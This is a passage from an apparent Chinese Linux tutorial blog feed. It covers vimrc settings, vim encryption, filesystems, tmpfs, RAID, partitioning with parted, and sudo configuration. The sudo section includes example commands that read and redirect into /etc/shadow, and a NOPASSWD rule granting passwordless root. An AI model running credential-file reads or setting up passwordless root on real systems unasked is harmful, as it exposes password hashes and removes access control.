在搜索时，输入的词句的逐字符高亮（类似firefox的搜索）set incsearch" 输入:set list命令是应该显示些啥？set listchars=tab:\|\ ,trail:.,extends:&gt;,precedes:&lt;,eol:$" 光标移动到buffer的顶部和底部时保持3行距离set scrolloff=3" 不要闪烁set novisualbell" 我的状态行显示的内容（包括文件类型和解码）set statusline=%F%m%r%h%w\[POS=%l,%v][%p%%]\%&#123;strftime(\"%d/%m/%y\ -\ %H:%M\")&#125;" 总是显示状态行set laststatus=2"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 文本格式和排版"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 自动格式化set formatoptions=tcrqn" 继承前一行的缩进方式，特别适用于多行注释set autoindent" 为C程序提供自动缩进set smartindent" 使用C样式的缩进set cindent" 制表符为4set tabstop=4" 统一缩进为4set softtabstop=4set shiftwidth=4" 不要用空格代替制表符set noexpandtab" 不要换行set nowrap" 在行和段开始处使用制表符set smarttab"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" CTags的设定"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 按照名称排序let Tlist_Sort_Type = "name"" 在右侧显示窗口let Tlist_Use_Right_Window = 1" 压缩方式let Tlist_Compart_Format = 1" 如果只有一个buffer，kill窗口也kill掉bufferlet Tlist_Exist_OnlyWindow = 1" 不要关闭其他文件的tagslet Tlist_File_Fold_Auto_Close = 0" 不要显示折叠树let Tlist_Enable_Fold_Column = 0"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" Autocommands"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 只在下列文件类型被侦测到的时候显示行号，普通文本文件不显示if has("autocmd")autocmd FileType xml,html,c,cs,java,perl,shell,bash,cpp,python,vim,php,ruby set numberautocmd FileType xml,html vmap 'o'&gt;o--&gt;autocmd FileType java,c,cpp,cs vmap ' 0 &amp;&amp; line("'\"") &lt;= line("$") |\ exe " normal g`\"" |\ endifendif "has("autocmd")" F5编译和运行C程序，F6编译和运行C++程序" 请注意，下述代码在windows下使用会报错" 需要去掉./这两个字符" C的编译和运行map :call CompileRunGcc()func! CompileRunGcc()exec "w"exec "!gcc % -o %&lt;"exec "! ./%&lt;"endfunc" C++的编译和运行map :call CompileRunGpp()func! CompileRunGpp()exec "w"exec "!g++ % -o %&lt;"exec "! ./%&lt;"endfunc" 能够漂亮地显示.NFO文件set encoding=utf-8function! SetFileEncodings(encodings)let b:myfileencodingsbak=&amp;fileencodingslet &amp;fileencodings=a:encodingsendfunctionfunction! RestoreFileEncodings()let &amp;fileencodings=b:myfileencodingsbakunlet b:myfileencodingsbakendfunctionau BufReadPre *.nfo call SetFileEncodings('cp437')|set ambiwidth=single au BufReadPost *.nfo call RestoreFileEncodings()" 高亮显示普通txt文件（需要txt.vim脚本）au BufRead,BufNewFile * setfiletype txt" 用空格键来开关折叠set foldenableset foldmethod=manualnnoremap @=((foldclosed(line('.')) &lt; 0) ? 'zc':'zo')" minibufexpl插件的一般设置let g:miniBufExplMapWindowNavVim = 1let g:miniBufExplMapWindowNavArrows = 1let g:miniBufExplMapCTabSwitchBufs = 1let g:miniBufExplModSelTarget = 1]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim给文件加密]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F33.%20vim%E7%BB%99%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[vim给文件加密&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux用vim/vi给文件加密和解密 一、利用 vim 加密：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：加密后，如果不知道密码，就看不到明文，包括root用户也看不了； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：很明显让别人知道加密了，容易让别人把加密的文件破坏掉，包括内容破坏和删除； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vi编辑器相信大家都很熟悉了吧，vi里有一个命令是给文件加密的，举个例子吧： 首先在root主目录/root/下建立一个实验文件text.txt： 1[root@www ~]# vim/vi text.txt 进到编辑模式，输入完内容后按ESC，然后输入:X（注意是大写的X），回车； 这时系统提示让你输入密码，2次，如下所示： 12输入密码: *******请再输入一次: ******* 保存后退出，现在这个文件已经加密了； 用cat或more查看文件内容，显示为乱码；用 vim重新编辑这个文件，会提示输入密码，如果输入的密码不正确，同样会显示为乱码！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：文件加密后，千万别忘了密码！ 二、解密用vi加密的文件（前提是你知道加密的密码）： 用 vim 打开文件如text.txt，要输入正确的密码，然后在编辑时，将密码设置为空，方法是输入下面的命令： 1：set key= &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后直接回车，保存文件后，文件已经解密了。 或者这样也行：在正确打开文件后用 “:X” 指令，然后给一个空密码也可以。保存用“wq!”保存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两种方法实际上效果是一样的。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim粘贴代码自动缩进导致全乱了]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F35.%20vim%E7%B2%98%E8%B4%B4%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E7%BC%A9%E8%BF%9B%E5%AF%BC%E8%87%B4%E5%85%A8%E4%B9%B1%E4%BA%86%2F</url>
    <content type="text"><![CDATA[vim粘贴代码自动缩进导致全乱了&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用vim打开一个空白文档，然后把已经复制的代码给粘贴进来，发现它有自动缩进功能，最终导致粘贴的文本一行比一行靠右，看起来乱成一团。比较快的解决办法是，在粘贴文档前，在命令行模式下，输入 1:set noai nosi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后按’i’ 进入编辑模式，再粘贴已经复制的代码内容，这样就不会自动缩进了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，这样的方法不好用，可以尝试这种： 1:set paste]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 的文件系统]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F18.%20Linux%20%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[Linux 的文件系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;搞计算机的应该都知道windows的系统格式化硬盘时会指定格式，fat 或者 ntfs。而 linux的文件系统格式为Ext3，或者Ext4 。早期的linux使用Ext2格式，目前的linux都使 用了Ext3, 而CentOS6已经使用了Ext4. Ext2文件系统虽然是高效稳定的。但是，随着 Linux系统在关键业务中的应用，Linux文件系统的弱点也渐渐显露出来了，因为Ext2文件系统是非日志文件系统。这在关键行业的应用是一个致命的弱点。Ext3文件系统是直接从 Ext2文件系统发展而来，Ext3文件系统带有日志功能，可以跟踪记录文件系统的变化，并将变化内容写入日志，写操作首先是对日志记录文件进行操作，若整个写操作由于某种原因 (如系统掉电) 而中断，系统重启时，会根据日志记录来恢复中断前的写操作，而且这个过程费时极短。目前Ext3文件系统已经非常稳定可靠。它完全兼容Ext2文件系统。用户可以平滑地过渡到一个日志功能健全的文件系统中来。这实际上了也是ext3日志文件系统初始设计的初衷。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而现在我们使用的Ext4文件系统，较Ext3文件系统又有很多好的特性，最明显的特征是，Ext4支持的最大文件系统容量和单个最大文件大小，详细的区别阿铭不再介绍，这需要你到网上搜一下以丰富你的知识点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件系统在windows中是不能识别的，但是在linux系统中你可以挂载的windows的文件系统，linux目前支持MS-DOS，VFAT，FAT，BSD等格式，如果你使用的是Redhat或者CentOS，那么请不要妄图挂载NTFS格式的分区到linux下，因为它不支持NTFS。虽然有些版本的linux支持NTFS，但不建议使用，因为目前的技术还不成熟。但有时，的确会有这方面 的需求，你可以安装ntfs-3g软件包来解决这个问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ext3文件系统为早期版本Redhat/CentOS默认使用的文件系统，目前Ext4为默认文件系统，除了Ext3/Ext4文件系统外，有些linux发行版例如SuSE默认的文件系统为reiserFS, Ext3 独特的优点就是易于转换，很容易在 Ext2 和 Ext3 之间相互转换，而具有良好的兼容性，其它优点 ReiserFS 都有，而且还比它做得更好。如高效的磁盘空间利用和独特的搜寻方式都是Ext3 所不具备的，速度上它也不能和 ReiserFS相媲美，在实际使用过程中，reiserFS 也更加安全高效，据说反删除功能也不错。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ReiserFS 的优势在于，它是基于 B*Tree 快速平衡树这种高效算法的文件系统，例如在处理小于 1k 的文件比 Ext文件系统快10倍。再一个就是ReiserFS空间浪费较少，它不会对一些小文件分配 inode，而是打包存放在同一个磁盘块 (簇) 中，Ext是把它们单独存放在不同的簇上，如簇大小为 4k，那么 2 个 100 字节的文件会占用 2 个簇，ReiserFS则只占用一个。当然ReiserFS也有缺点，就是每升级一个版本，都要将磁盘重新格式化一次。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmpfs 是什么]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F19.%20tmpfs%20%E6%98%AF%E4%BB%80%E4%B9%88%2F</url>
    <content type="text"><![CDATA[tmpfs 是什么&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们df 的时候会看到一行 12345[root@localhost ~]# dfFilesystem 1K-blocks Used Available Use% Mounted on/dev/mapper/VolGroup-lv_root 18102140 1429428 15753160 9% /tmpfs 146844 0 146844 0% /dev/shm/dev/sda1 495844 31636 438608 7% /boot &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的大小为 146844，这个数值其实正好是内存大小的一半： 12345[root@localhost ~]# free total used free shared buffers cachedMem: 293692 203528 90164 0 15880 125184-/+ buffers/cache: 62464 231228Swap: 2064376 0 2064376 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个tmpfs到底是什么呢? 其实它是一个临时文件系统，驻留于内存中，使用它可以提高文件访问速度，并能保证重启时会自动清除这些文件。只不过驻留在这里的文件是容易丢失的，因为内存数据是不会像硬盘中的数据那样可以永久存在。知道了tmpfs的这个特性后，我们就可以把一些对读写性能要求较高，但是数据又可以丢失的这样的数据就可以保存在/dev/shm中，你也可以认为这里就是内存。既然/dev/shm是内存，那么想当然，我们不能把全部内存都挂载到这个目录下，系统默认只分一半是有道理的。那么我们能不能更改这个tmpfs的大小？ 当然可以！ 123456[root@localhost ~]# mount -o remount,size=180M tmpfs /dev/shm[root@localhost ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/mapper/VolGroup-lv_root 18G 1.4G 16G 9% /tmpfs 180M 0 180M 0% /dev/shm/dev/sda1 485M 31M 429M 7% /boot &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以说，这个tmpfs是可以更改的，但这种办法知识临时的，重启后还会恢复内存大小的一半。那如何让他永久生效？、 12[root@localhost ~]# vi /etc/fstab //编辑/etc/fstab， 把tmpfs这一行改为：tmpfs /dev/shm tmpfs defaults,size=180M 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以啦。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 系统下查看raid信息，以及磁盘信息]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F21.%20Linux%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%9F%A5%E7%9C%8Braid%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BB%A5%E5%8F%8A%E7%A3%81%E7%9B%98%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[Linux 系统下查看raid信息，以及磁盘信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时想知道服务器上有几块磁盘，如果没有做raid，则可以简单使用fdisk -l 就可以看到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是做了raid呢，这样就看不出来了。那么如何查看服务器上做了raid？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;软件raid：只能通过Linux系统本身来查看 1cat /proc/mdstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到raid级别，状态等信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;硬件raid： 最佳的办法是通过已安装的raid厂商的管理工具来查看，有cmdline，也有图形界面。如Adaptec公司的硬件卡就可以通过下面的命令进行查看： 1# /usr/dpt/raidutil -L all &#160;&#160;&#160;&#160;&#160;&#160;可以看到非常详细的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然更多情况是没有安装相应的管理工具，只能依靠Linux本身的话一般我知道的是两种方式： 123# dmesg |grep -i raid # cat /proc/scsi/scsi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示的信息差不多，raid的厂商，型号，级别，但无法查看各块硬盘的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下信息作为案例， 命令为 12345678910111213141516171819202122# fdisk -l Disk /dev/sda: 145.9 GB, 145999527936 bytes255 heads, 63 sectors/track, 17750 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System/dev/sda1 * 1 13 104391 83 Linux/dev/sda2 14 17750 142472452+ 8e Linux LVM# cat /proc/scsi/scsiAttached devices:Host: scsi0 Channel: 00 Id: 00 Lun: 00 Vendor: SEAGATE Model: ST3146356SS Rev: HS09 Type: Direct-Access ANSI SCSI revision: 05Host: scsi0 Channel: 00 Id: 01 Lun: 00 Vendor: SEAGATE Model: ST3146356SS Rev: HS09 Type: Direct-Access ANSI SCSI revision: 05Host: scsi0 Channel: 01 Id: 00 Lun: 00 Vendor: Dell Model: VIRTUAL DISK Rev: 1028 Type: Direct-Access ANSI SCSI revision: 05 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过以上信息可以看出，该服务器有两块磁盘。品牌是希捷的，磁盘代号为 ST3146356SS，如果你熟悉细节磁盘的代号命名规则，你会轻易判定该磁盘大小为146G 。再根据fdisk 得出的结果可以判定，该服务器是拿两块146G的硬盘做的raid1.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[增加磁盘的inode数]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F26.%E5%A2%9E%E5%8A%A0%E7%A3%81%E7%9B%98%E7%9A%84inode%E6%95%B0%2F</url>
    <content type="text"><![CDATA[增加磁盘的inode数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;inode这个词大多资料都是译为索引节点，在ext3文件系统，调整磁盘的inode number。这里只是调整inode number这个参数，如果想调整inode size或是blocksize等可以具体mkfs.ext3命令。 卸载文件系统 1# umount /dev/sda6 建立文件系统，指定inode节点数 12# mkfs.ext3 /dev/sda6 -N "inode节点数"## mkfs.ext3 命令的-N 选项用于指定自定义的inode节点数 挂载文件系统 1# mout /dev/sda6 /data 查看修改后的inode参数 1# dumpe2fs -h /dev/sda6 | grep node &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意:调整inode数会格式化磁盘，执行前应确定磁盘上没有重要数据或是先备份数据]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[parted 分区 GPT 格式]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F22.%20parted%20%E5%88%86%E5%8C%BA%20GPT%E6%A0%BC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[parted 分区 GPT 格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们讲的fdisk分区工具，它的分区格式为MBR，特点是，最多分4个主分区，磁盘大小不能超过2T。而GPT分区格式，突破了这些限制，它没有主分区、扩展分区、逻辑分区之分，在一块磁盘上最多可以分128个分区出来，支持大于2T的分区，最大卷可达18EB。 相信，随着存储级别的升级，将来的分区格式逐渐会淘汰MBR，而GPT成为主流。 parted 工具常用功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当在命令行输入parted后，进入parted命令的交互模式。输入help会显示帮助信息。下面就简单介绍一下常用的功能 check 简单检查文件系统。建议用其他命令检查文件系统，比如fsck help 显示帮助信息 mklabel 创建分区表， 即是使用msdos（MBR）还是使用gpt，或者是其他方式分区表 mkfs 创建文件系统。该命令不支持ext3 格式，因此建议不使用，最好是用parted分好区，然后退出parted交互模式，用其他命令进行分区，比如：mkfs.ext3 mkpart 创建新分区。格式： 1mkpart PART-TYPE [FS-TYPE] START END &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PART-TYPE 类型主要有primary（主分区）, extended（扩展分区）, logical（逻辑区）. 扩展分区和逻辑分区只对msdos。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fs-type 文件系统类型，主要有fs32，NTFS，ext2，ext3等&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;start end 分区的起始和结束位置。 mkpartfs 建立分区及其文件系统。目前还不支持ext3文件系统，因此不建议使用该功能。最后是分好区后，退出parted，然后用其他命令建立文件系统。 print 输出分区信息。该功能有3个选项，free 显示该盘的所有信息，并显示磁盘剩余空间number 显示指定的分区的信息all 显示所有磁盘信息 resize 调整指定的分区的大小。目前对ext3格式支持不是很好，所以不建议使用该功能。 rescue 恢复不小心删除的分区。如果不小心用parted的rm命令删除了一个分区，那么可以通过rescue功能进行恢复。恢复时需要给出分区的起始和结束的位置。然后parted就会在给定的范围内去寻找，并提示恢复分区。 rm 删除分区。命令格式 rm number 。如：rm 3 就是将编号为3的分区删除 select 选择设备。当输入parted命令后直接回车进入交互模式是，如果有多块硬盘，需要用select 选择要操作的硬盘。如：select /dev/sdb set 设置标记。更改指定分区编号的标志。标志通常有如下几种：boot hidden raid lvm 等。boot 为引导分区，hidden 为隐藏分区，raid 软raid，lvm 为逻辑分区。如：set 3 boot on 设置分区号3 为启动分区注：以上内容为parted常用的功能，由于该工具目前对ext3支持得不是很好，因此有些功能无法应用，比如move（移动分区）和resize等。 parted分区功能事例。 用命令模式 为/dev/sdb创建gpt类型文件分区表,并分500G分区。然后为该分区创建ext3文件系统。并将该分区挂载在/test文件夹下。 1234# parted /dev/sdb mklabel —创建分区表# parted /dev/sdb mkpart ext3 0 500000 —创建500G分区/dev/sdb1# mkfs.ext3 /dev/sdb1 —-将分区/dev/sdb1格式化成ext3格式文件系统# mount /dev/sdb1 /test —将/dev/sdb1 挂载在/test下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果让系统自动挂载/dev/sdb1 需手工编辑/etc/fstab文件。并在文件末尾添加如下内容： 1/dev/sdb1 /test ext3 defaults 0 0 创建大小为4G的交互分区。由于已经创建了500G的/dev/sdb1 ,因此再创建的分区为/dev/sdb2 123# parted /dev/sdb mkpart swap 500000 504000 —创建4G分区/dev/sdb2# mkswap /dev/sdb2 —-将/dev/sdb2创建为交换分区# swapon /dev/sdb2 —-激活/dev/sdb2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果让系统自动挂载/dev/sdb2这个交换分区，需手工编辑/etc/fstab文件。并在文件末尾添加如下内容： 1/dev/sdb2 swap swap defaults 0 0 恢复被误删除的分区(也可以参考testdisk命令)。由于parted直接写磁盘，因此一旦不小心删除了某一分区，建议立即用rescue恢复。下面通过事例来理解恢复过程。 1234# parted /dev/sdb mkpart ext3 504000 514000 —-创建10G分区/dev/sdb3# mkfs.ext3 /dev/sdb3 —将/dev/sdb3格式化成ext3文件系统。# parted /dev/sdb rm 3 —-删除/dev/sdb3# parted /dev/sdb rescue 504000 514000 —依照屏幕提示，输入yes即可恢复被误删除分区]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux sudo 详解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F13.%20Linux%20sudo%20%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Linux sudo 详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 su 可以切换用户身份，如果每个普通用户都能切换到 root 身份，如果某个用户不小心泄漏了 root 密码，那么系统是非常的不安全的。为了改进这个问题，产生了 sudo 这个命令。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 sudo 执行一个 root 才能执行的命令是可以办到的，但是需要输入密码，这个密码并不是 root 的密码，而是用户自己的密码。默认只有 root 用户能使用 sudo 命令，普通用户想要使用 sudo ，是需要 root 预先设定的。使用 visudo 命令去编辑相关的配置文件 /etc/sudoers 。如果没有 visudo 这个命令，使用 yum 安装： 1yum install -y sudo 语法1sudo [选项] [参数] 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-b：在后台执行指令；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-h：显示帮助；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-H：将HOME环境变量设为新身份的HOME环境变量；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-k：结束密码的有效期限，也就是下次再执行sudo时便需要输入密码；。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l：列出目前用户可执行与无法执行的指令；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-p：改变询问密码的提示符号；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-s：执行指定的shell；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u&lt;用户&gt;：以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-v：延长密码有效期限5分钟；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-V ：显示版本信息。 参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指令：需要运行的指令和对应的参数。 配置 sudo&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认 root 能够 sudo 是因为这个文件中有一行 “root ALL=(ALL) ALL” 在该行下面加入 “test ALL=(ALL) ALL” 就可以让 test 用户拥有了 sudo 的权利。使用 “visudo” 命令编辑 /etc/sudoers 配置文件，其实操作方法和 “vim” 命令使用方法是一样的，按 “i” 进入编辑模式，编辑完成后，按 “Esc” ，再输入 “:wq” 完成保存。 123## Allow root to run any commands anywhereroot ALL=(ALL) ALLtest ALL=(ALL) ALL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时可以验证一下 test 账户的权限了 1234567891011121314[root@localhost ~]# su test[test@localhost root]$ lsls: 无法打开目录.: 权限不够[test@localhost root]$ sudo lsWe trust you have received the usual lecture from the local SystemAdministrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility.[sudo] password for test:123 456 789 anaconda-ks.cfg dirb install.log install.log.syslog test test1 test2 test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于切换到 test 账户后的当前目录依旧是在 /root 下， test 账户没有任何权限，所以 ‘ls’ 的时候提示说权限不够，然而使用 sudo ls 输入 test 账户自身的密码后就有权限了。初次使用 sudo 时会有上面的一大段提示，而后再次使用 sudo 命令则不再提示。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果每增加一用户就设置一行，这样太麻烦了。所以可以这样设置。把 “#%wheel ALL=(ALL) ALL” 前面 ‘#’ 去掉，让这一行生效。意思是， wheel 这个组的所有用户都拥有了 sudo 权利。接下来只需要把想让 sudo 权利的所有用户加入到 wheel 这个组中即可： 12## Allows people in group wheel to run all commands%wheel ALL=(ALL) ALL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件 /etc/sudoers 包含了诸多配置项，可以使用 man sudoers 来获得帮助信息。 实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置 sudo 必须通过编辑 /etc/sudoers 文件，而且只有超级用户才可以修改它，还必须使用 visudo 编辑。之所以使用 visudo 有两个原因： 它能后防止一两个用户同时修改它； 它也能进行有限的语法检查。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，即时只有一个超级用户，也最好用 visudo 来检查一下语法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;visudo 默认的是在 vi 里打开配置文件，用 vi 来修改文件。可以在编译时修改这个默认项。 visudo 不会擅自保存带有语法错误的配置文件，它会提示出现的问题，并询问该如何处理： 1&gt;&gt;&gt; sudoers file: syntax error, line 22 &lt;&lt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时有三种选择： 键入 “e” 是重新编辑 键入 “x” 是不保存退出 键入 “Q” 是退出并保存 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果选择 Q ,那么 sudo 将不回再运行，知道错误被纠正。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求是把 Linux 服务器设置成：只允许使用普通账户登录，而普通账户登录后，可以不输入密码就能 sudo 切换到 root 账户。 1[root@localhost ~]# visudo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在文件的最后面加三行： 123User_Alias USER_SU = test, test1, yanyiCmnd_Alias SU = /bin/suUSER_SU ALL=(ALL) NOPASSWD: SU &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置文件后，使用 test 、test1 、yanyi 三个账户登录 Linux 后，执行命令 sudo su - 切换到 root 账户，获取 root 账户的所有权利。 1234[root@localhost ~]# su - test[test@localhost ~]$ sudo su -[root@localhost ~]# whoamiroot 日志与安全&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo 为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是， sudo 的日志功能不是自动的，必须由管理员开启。 12touch /var/log/sudovi /etc/syslog.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 syslog.conf 最后面加一行（必须用 tab 分隔开）并保存： 1local2.debug /var/log/sudo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启日志守候进程 1ps aux | grep syslogd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把得到的 syslog 进程的 PID (输出的第二列是 PID)填入下面 1kill -HUP PID &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样 sudo 就可以写日志了： 12345[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg Desktop install.log install.log.syslog $cat /var/log/sudoJul 28 22:52:54 localhost sudo: foobar : TTY=pts/1 ; pwd=/home/foobar ; USER=root ; command=/bin/ls /root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过，有个小小的“缺陷”，sudo 记录日志并不是很忠实： 123[foobar@localhost ~]$ sudo cat /etc/shadow &gt; /dev/nullcat /var/log/sudo...Jul 28 23:10:24 localhost sudo: foobar : TTY=pts/1 ;PWD=/home/foobar ; USER=root ; COMMAND=/bin/cat /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重定向没有被记录在日志里，因为在命令运行之前，shell 把重定向的工作做完了，sudo 根本就没有看到重定向。这样也有个好处，下面的手段不回得逞： 1[foobar@localhost ~]$ sudo ls /root &gt; /etc/shadowbash: /etc/shadow: 权限不够 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo 有自己的方式来保护安全。以 root 的身份执行 sudo -v ，查看 sudo 的设置。因为考虑到安全问题，一部分环境变量并没有传递给 sudo 后面的命令，或者被检查后再传递的，比如：PATH 、HOME 、SHELL 等。当然也可以通过 sudoers 来配置环境变量。 sudo -i 也可以登录到 root&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo : 暂时切换到超级用户模式以执行超级用户权限，提示输入密码时该密码为当前用户的密码，而不是超级账户的密码。不过有时间限制，Ubuntu默认为一次时长15分钟。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su ： 切换到某某用户模式，提示输入密码时该密码为切换后账户的密码，用法为“su 账户名称”。如果后面不加账户时系统默认为root账户，密码也为超级账户的密码。没有时间限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo -i: 为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为“#”而不是“$”。想退回普通账户时可以执行“exit”或“logout” 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有几个类似的用法： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo /bin/bash ： 这个命令也会切换到root的bash下，但不能完全拥有root的所有环境变量，比如PATH，可以拥有root用户的权限。这个命令和 sudo -s 是等同的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo -s : 如上 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo su ： 这个命令，也是登录到了root，但是并没有切换root的环境变量，比如PATH。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo su - : 这个命令，纯粹的切换到root环境下，可以这样理解，先是切换到了root身份，然后又以root身份执行了 su - ，这个时候跟使用root登录没有什么区别。这个结果貌似跟sudo -i 的效果是一样的，但是也有不同，sudo 只是临时拥有了root的权限，而su则是使用root账号登录了linux系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，我们再来总结一下： sudo su - 约等于 sudo -i sudo -s 完全等于 sudo /bin/bash 约等于 sudo su sudo 